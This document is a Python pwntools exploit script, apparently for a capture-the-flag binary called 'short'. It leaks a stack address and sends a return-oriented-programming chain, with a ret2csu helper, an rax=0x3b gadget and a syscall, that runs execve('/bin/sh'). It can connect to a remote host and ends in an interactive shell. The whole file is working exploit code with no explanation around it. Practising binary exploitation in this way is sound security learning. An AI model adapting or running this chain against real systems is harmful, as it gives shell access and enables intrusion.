from pwn import *
LOCAL = 1
DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
if LOCAL:
    p = process('./short')#,env={'LD_PRELOAD':'./ld-2.29.so'})
    #libc = ELF('./libc-2.29.so')
else:
    p = remote("172.29.20.114",9999)
    #libc = ELF('./libc-2.29.so')
main = 0x40051D
elf = ELF("./short")
syscall = 0x0000000000400517
rax_3b = 0x00000000004004e3
pop_rdi = 0x00000000004005a3	
def csu(r12, r13, r14, r15):
	# pop rbx,rbp,r12,r13,r14,r15
	# rbx should be 0,
	# rbp should be 1,enable not to jump
	# r12 should be the function we want to call
	# rdi=edi=r15d
	# rsi=r14
	# rdx=r13
	csu_end_addr = 0x0000000040059A
	csu_front_addr = 0x0000000000400580
	payload = p64(csu_end_addr) + p64(0) + p64(1) + p64(r12) + p64(
	r13) + p64(r14) + p64(r15)
	payload += p64(csu_front_addr)
	return payload

def exp():
	offset = 16
	payload = "/bin/sh\x00" + "a"*8 + p64(main)# ret main
	#gdb.attach(p,"b *0x400519")
	#pause()
	p.sendline(payload)
	p.recvn(0x20)
	data = u64(p.recvn(8)) - 0x118#0x128
	print hex(data) # stack addr
	payload = "/bin/sh\x00" + p64(pop_rdi) + p64(rax_3b) # set rax to 0x3b
	#payload += csu(data-0x18,0,0,0) # data-0x18 -> pop_rdi(csu -> call pop_rdi) and set rsi,rdx = 0
	payload += p64(pop_rdi) + p64(data-0x20) + p64(syscall) # data-0x20 -> /bin/sh\x00
	p.sendline(payload)# second read
exp()
p.interactive()
